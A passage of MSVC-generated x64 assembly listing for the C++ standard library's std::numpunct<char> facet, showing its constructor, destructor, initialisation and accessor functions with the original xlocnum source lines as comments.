	mov	rcx, QWORD PTR this$[rsp]
	call	??1?$numpunct@D@std@@MEAA@XZ		; std::numpunct<char>::~numpunct<char>
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 48					; 00000030H
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_G?$numpunct@D@std@@MEAAPEAXI@Z ENDP			; std::numpunct<char>::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Tidy@?$numpunct@D@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy@?$numpunct@D@std@@AEAAXXZ PROC			; std::numpunct<char>::_Tidy, COMDAT

; 217  :     void _Tidy() noexcept { // free all storage

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 218  :         _CSTD free(const_cast<char*>(_Grouping));

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+16]
	call	free

; 219  :         _CSTD free(const_cast<_Elem*>(_Falsename));

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+32]
	call	free

; 220  :         _CSTD free(const_cast<_Elem*>(_Truename));

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+40]
	call	free

; 221  :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Tidy@?$numpunct@D@std@@AEAAXXZ ENDP			; std::numpunct<char>::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_truename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
__$ReturnUdt$ = 72
?do_truename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ PROC ; std::numpunct<char>::do_truename, COMDAT

; 212  :     virtual string_type __CLR_OR_THIS_CALL do_truename() const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	DWORD PTR $T1[rsp], 0

; 213  :         return string_type(_Truename);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+40]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 214  :     }

	add	rsp, 56					; 00000038H
	ret	0
?do_truename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ENDP ; std::numpunct<char>::do_truename
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_falsename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
__$ReturnUdt$ = 72
?do_falsename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ PROC ; std::numpunct<char>::do_falsename, COMDAT

; 208  :     virtual string_type __CLR_OR_THIS_CALL do_falsename() const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	DWORD PTR $T1[rsp], 0

; 209  :         return string_type(_Falsename);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+32]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 210  :     }

	add	rsp, 56					; 00000038H
	ret	0
?do_falsename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ENDP ; std::numpunct<char>::do_falsename
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_grouping@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
__$ReturnUdt$ = 72
?do_grouping@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ PROC ; std::numpunct<char>::do_grouping, COMDAT

; 204  :     virtual string __CLR_OR_THIS_CALL do_grouping() const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	DWORD PTR $T1[rsp], 0

; 205  :         return string(_Grouping);

	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+16]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 206  :     }

	add	rsp, 56					; 00000038H
	ret	0
?do_grouping@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ENDP ; std::numpunct<char>::do_grouping
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_thousands_sep@?$numpunct@D@std@@MEBADXZ
_TEXT	SEGMENT
this$ = 8
?do_thousands_sep@?$numpunct@D@std@@MEBADXZ PROC	; std::numpunct<char>::do_thousands_sep, COMDAT

; 200  :     virtual _Elem __CLR_OR_THIS_CALL do_thousands_sep() const {

	mov	QWORD PTR [rsp+8], rcx

; 201  :         return _Kseparator;

	mov	rax, QWORD PTR this$[rsp]
	movzx	eax, BYTE PTR [rax+25]

; 202  :     }

	ret	0
?do_thousands_sep@?$numpunct@D@std@@MEBADXZ ENDP	; std::numpunct<char>::do_thousands_sep
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_decimal_point@?$numpunct@D@std@@MEBADXZ
_TEXT	SEGMENT
this$ = 8
?do_decimal_point@?$numpunct@D@std@@MEBADXZ PROC	; std::numpunct<char>::do_decimal_point, COMDAT

; 196  :     virtual _Elem __CLR_OR_THIS_CALL do_decimal_point() const {

	mov	QWORD PTR [rsp+8], rcx

; 197  :         return _Dp;

	mov	rax, QWORD PTR this$[rsp]
	movzx	eax, BYTE PTR [rax+24]

; 198  :     }

	ret	0
?do_decimal_point@?$numpunct@D@std@@MEBADXZ ENDP	; std::numpunct<char>::do_decimal_point
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z
_TEXT	SEGMENT
tv82 = 32
_Ptr$ = 40
_Guard$ = 48
$T1 = 64
_Cvt$ = 112
$T2 = 160
__$ArrayPad$ = 208
this$ = 256
_Lobj$ = 264
_Isdef$ = 272
?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z PROC	; std::numpunct<char>::_Init, COMDAT

; 173  :     void _Init(const _Locinfo& _Lobj, bool _Isdef = false) { // initialize from _Lobj

$LN8:
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 232				; 000000e8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 174  :         const lconv* _Ptr      = _Lobj._Getlconv();

	mov	rcx, QWORD PTR _Lobj$[rsp]
	call	?_Getlconv@_Locinfo@std@@QEBAPEBUlconv@@XZ ; std::_Locinfo::_Getlconv
	mov	QWORD PTR _Ptr$[rsp], rax

; 175  :         _Locinfo::_Cvtvec _Cvt = _Lobj._Getcvt(); // conversion information

	lea	rdx, QWORD PTR _Cvt$[rsp]
	mov	rcx, QWORD PTR _Lobj$[rsp]
	call	?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ ; std::_Locinfo::_Getcvt

; 176  : 
; 177  :         _Grouping  = nullptr;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+16], 0

; 178  :         _Falsename = nullptr;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+32], 0

; 179  :         _Truename  = nullptr;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+40], 0

; 180  : 
; 181  :         _Tidy_guard<numpunct> _Guard{this};

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _Guard$[rsp], rax

; 182  :         _Grouping      = _Maklocstr(_Isdef ? "" : _Ptr->grouping, static_cast<char*>(nullptr), _Lobj._Getcvt());

	movzx	eax, BYTE PTR _Isdef$[rsp]
	test	eax, eax
	je	SHORT $LN5@Init
	lea	rax, OFFSET FLAT:??_C@_00CNPNBAHC@@
	mov	QWORD PTR tv82[rsp], rax
	jmp	SHORT $LN6@Init
$LN5@Init:
	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	rax, QWORD PTR [rax+16]
	mov	QWORD PTR tv82[rsp], rax
$LN6@Init:
	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, QWORD PTR _Lobj$[rsp]
	call	?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ ; std::_Locinfo::_Getcvt
	mov	r8, rax
	xor	edx, edx
	mov	rcx, QWORD PTR tv82[rsp]
	call	??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z ; std::_Maklocstr<char>
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+16], rax

; 183  :         _Falsename     = _Maklocstr(_Lobj._Getfalse(), static_cast<_Elem*>(nullptr), _Cvt);

	mov	rcx, QWORD PTR _Lobj$[rsp]
	call	?_Getfalse@_Locinfo@std@@QEBAPEBDXZ	; std::_Locinfo::_Getfalse
	lea	r8, QWORD PTR _Cvt$[rsp]
	xor	edx, edx
	mov	rcx, rax
	call	??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z ; std::_Maklocstr<char>
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+32], rax

; 184  :         _Truename      = _Maklocstr(_Lobj._Gettrue(), static_cast<_Elem*>(nullptr), _Cvt);

	mov	rcx, QWORD PTR _Lobj$[rsp]
	call	?_Gettrue@_Locinfo@std@@QEBAPEBDXZ	; std::_Locinfo::_Gettrue
	lea	r8, QWORD PTR _Cvt$[rsp]
	xor	edx, edx
	mov	rcx, rax
	call	??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z ; std::_Maklocstr<char>
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+40], rax

; 185  :         _Guard._Target = nullptr;

	mov	QWORD PTR _Guard$[rsp], 0

; 186  : 
; 187  :         if (_Isdef) { // apply defaults for required facets

	movzx	eax, BYTE PTR _Isdef$[rsp]
	test	eax, eax
	je	SHORT $LN2@Init

; 188  :             // _Grouping = _Maklocstr("", static_cast<char *>(nullptr), _Cvt);
; 189  :             _Dp         = _Maklocchr('.', static_cast<_Elem*>(nullptr), _Cvt);

	lea	r8, QWORD PTR _Cvt$[rsp]
	xor	edx, edx
	mov	cl, 46					; 0000002eH
	call	??$_Maklocchr@D@std@@YADDPEADAEBU_Cvtvec@@@Z ; std::_Maklocchr<char>
	mov	rcx, QWORD PTR this$[rsp]
	mov	BYTE PTR [rcx+24], al

; 190  :             _Kseparator = _Maklocchr(',', static_cast<_Elem*>(nullptr), _Cvt);

	lea	r8, QWORD PTR _Cvt$[rsp]
	xor	edx, edx
	mov	cl, 44					; 0000002cH
	call	??$_Maklocchr@D@std@@YADDPEADAEBU_Cvtvec@@@Z ; std::_Maklocchr<char>
	mov	rcx, QWORD PTR this$[rsp]
	mov	BYTE PTR [rcx+25], al

; 191  :         } else {

	jmp	SHORT $LN3@Init
$LN2@Init:

; 192  :             _Getvals(_Elem{}, _Ptr, _Cvt);

	lea	rax, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR _Cvt$[rsp]
	mov	rdi, rax
	mov	rsi, rcx
	mov	ecx, 44					; 0000002cH
	rep movsb
	lea	r9, QWORD PTR $T1[rsp]
	mov	r8, QWORD PTR _Ptr$[rsp]
	xor	edx, edx
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Getvals@D@?$numpunct@D@std@@IEAAXDPEBUlconv@@U_Cvtvec@@@Z ; std::numpunct<char>::_Getvals<char>
	npad	1
$LN3@Init:

; 193  :         }
; 194  :     }

	lea	rcx, QWORD PTR _Guard$[rsp]
	call	??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ ; std::_Tidy_guard<std::numpunct<char> >::~_Tidy_guard<std::numpunct<char> >
	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 232				; 000000e8H
	pop	rdi
	pop	rsi
	ret	0
?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z ENDP	; std::numpunct<char>::_Init
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv82 = 32
_Ptr$ = 40
_Guard$ = 48
$T1 = 64
_Cvt$ = 112
$T2 = 160
__$ArrayPad$ = 208
this$ = 256
_Lobj$ = 264
_Isdef$ = 272
?dtor$0@?0??_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z@4HA PROC ; `std::numpunct<char>::_Init'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Guard$[rbp]
	call	??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ ; std::_Tidy_guard<std::numpunct<char> >::~_Tidy_guard<std::numpunct<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z@4HA ENDP ; `std::numpunct<char>::_Init'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??1?$numpunct@D@std@@MEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$numpunct@D@std@@MEAA@XZ PROC			; std::numpunct<char>::~numpunct<char>, COMDAT

; 152  :     __CLR_OR_THIS_CALL ~numpunct() noexcept override {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7?$numpunct@D@std@@6B@
	mov	QWORD PTR [rax], rcx

; 153  :         _Tidy();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy@?$numpunct@D@std@@AEAAXXZ	; std::numpunct<char>::_Tidy

; 154  :     }

	mov	rcx, QWORD PTR this$[rsp]
	call	??1facet@locale@std@@MEAA@XZ		; std::locale::facet::~facet
	add	rsp, 40					; 00000028H
	ret	0
??1?$numpunct@D@std@@MEAA@XZ ENDP			; std::numpunct<char>::~numpunct<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 40
tv90 = 48
tv132 = 56
tv129 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z PROC ; std::numpunct<char>::_Getcat, COMDAT

; 143  :     static size_t _Getcat(const locale::facet** _Ppf = nullptr, const locale* _Ploc = nullptr) {

$LN10:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 200				; 000000c8H
	mov	DWORD PTR $T1[rsp], 0

; 144  :         // return locale category mask and construct standard facet
; 145  :         if (_Ppf && !*_Ppf) {

	cmp	QWORD PTR _Ppf$[rsp], 0
	je	$LN2@Getcat
	mov	rax, QWORD PTR _Ppf$[rsp]
	cmp	QWORD PTR [rax], 0
	jne	$LN2@Getcat

; 146  :             *_Ppf = new numpunct<_Elem>(_Locinfo(_Ploc->c_str()), 0, true);

	mov	ecx, 48					; 00000030H
	call	??2@YAPEAX_K@Z				; operator new
	mov	QWORD PTR $T2[rsp], rax
	cmp	QWORD PTR $T2[rsp], 0
	je	SHORT $LN4@Getcat
	mov	rcx, QWORD PTR _Ploc$[rsp]
	call	?c_str@locale@std@@QEBAPEBDXZ		; std::locale::c_str
	mov	rdx, rax
	lea	rcx, QWORD PTR $T4[rsp]
	call	??0_Locinfo@std@@QEAA@PEBD@Z		; std::_Locinfo::_Locinfo
	mov	QWORD PTR tv132[rsp], rax
	mov	rax, QWORD PTR tv132[rsp]
	mov	QWORD PTR tv129[rsp], rax
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	r9b, 1
	xor	r8d, r8d
	mov	rdx, QWORD PTR tv129[rsp]
	mov	rcx, QWORD PTR $T2[rsp]
	call	??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z ; std::numpunct<char>::numpunct<char>
	mov	QWORD PTR tv90[rsp], rax
	jmp	SHORT $LN5@Getcat
$LN4@Getcat:
	mov	QWORD PTR tv90[rsp], 0
$LN5@Getcat:
	mov	rax, QWORD PTR tv90[rsp]
	mov	QWORD PTR $T3[rsp], rax
	mov	rax, QWORD PTR _Ppf$[rsp]
	mov	rcx, QWORD PTR $T3[rsp]
	mov	QWORD PTR [rax], rcx
	mov	eax, DWORD PTR $T1[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@Getcat
	and	DWORD PTR $T1[rsp], -2
	lea	rcx, QWORD PTR $T4[rsp]
	call	??1_Locinfo@std@@QEAA@XZ		; std::_Locinfo::~_Locinfo
$LN2@Getcat:

; 147  :         }
; 148  :         return _X_NUMERIC;

	mov	eax, 4

; 149  :     }

	add	rsp, 200				; 000000c8H
	ret	0
?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ENDP ; std::numpunct<char>::_Getcat
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
tv90 = 48
tv132 = 56
tv129 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?dtor$0@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA PROC ; `std::numpunct<char>::_Getcat'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	edx, 48					; 00000030H
	mov	rcx, QWORD PTR $T2[rbp]
	call	??3@YAXPEAX_K@Z				; operator delete
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA ENDP ; `std::numpunct<char>::_Getcat'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
tv90 = 48
tv132 = 56
tv129 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA PROC ; `std::numpunct<char>::_Getcat'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	eax, DWORD PTR $T1[rbp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN8@dtor$1
	and	DWORD PTR $T1[rbp], -2
	lea	rcx, QWORD PTR $T4[rbp]
	call	??1_Locinfo@std@@QEAA@XZ		; std::_Locinfo::~_Locinfo
$LN8@dtor$1:
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA ENDP ; `std::numpunct<char>::_Getcat'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z
_TEXT	SEGMENT
this$ = 48
_Lobj$ = 56
_Refs$ = 64
_Isdef$ = 72
??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z PROC	; std::numpunct<char>::numpunct<char>, COMDAT

; 139  :     numpunct(const _Locinfo& _Lobj, size_t _Refs = 0, bool _Isdef = false) : locale::facet(_Refs) {

$LN4:
	mov	BYTE PTR [rsp+32], r9b
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR _Refs$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0facet@locale@std@@IEAA@_K@Z		; std::locale::facet::facet
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7?$numpunct@D@std@@6B@
	mov	QWORD PTR [rax], rcx

; 140  :         _Init(_Lobj, _Isdef);

	movzx	r8d, BYTE PTR _Isdef$[rsp]
	mov	rdx, QWORD PTR _Lobj$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z ; std::numpunct<char>::_Init
	npad	1

; 141  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z ENDP	; std::numpunct<char>::numpunct<char>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Lobj$ = 56
_Refs$ = 64
_Isdef$ = 72
?dtor$0@?0???0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z@4HA PROC ; `std::numpunct<char>::numpunct<char>'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1facet@locale@std@@MEAA@XZ		; std::locale::facet::~facet
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z@4HA ENDP ; `std::numpunct<char>::numpunct<char>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?truename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
__$ReturnUdt$ = 72
?truename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ PROC ; std::numpunct<char>::truename, COMDAT

; 125  :     string_type truename() const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	DWORD PTR $T1[rsp], 0

; 126  :         return do_truename();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+56]
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 127  :     }

	add	rsp, 56					; 00000038H
	ret	0
?truename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ENDP ; std::numpunct<char>::truename
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?falsename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
__$ReturnUdt$ = 72
?falsename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ PROC ; std::numpunct<char>::falsename, COMDAT

; 121  :     string_type falsename() const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	DWORD PTR $T1[rsp], 0

; 122  :         return do_falsename();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+48]
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 123  :     }

	add	rsp, 56					; 00000038H
	ret	0
?falsename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ENDP ; std::numpunct<char>::falsename
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
__$ReturnUdt$ = 72
?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ PROC ; std::numpunct<char>::grouping, COMDAT

; 117  :     string grouping() const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	DWORD PTR $T1[rsp], 0

; 118  :         return do_grouping();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+40]
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 119  :     }

	add	rsp, 56					; 00000038H
	ret	0
?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ENDP ; std::numpunct<char>::grouping
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?thousands_sep@?$numpunct@D@std@@QEBADXZ
_TEXT	SEGMENT
this$ = 48
?thousands_sep@?$numpunct@D@std@@QEBADXZ PROC		; std::numpunct<char>::thousands_sep, COMDAT

; 113  :     _Elem thousands_sep() const {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 114  :         return do_thousands_sep();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+32]

; 115  :     }

	add	rsp, 40					; 00000028H
	ret	0
?thousands_sep@?$numpunct@D@std@@QEBADXZ ENDP		; std::numpunct<char>::thousands_sep
_TEXT	ENDS
; Function compile flags: /Odtp
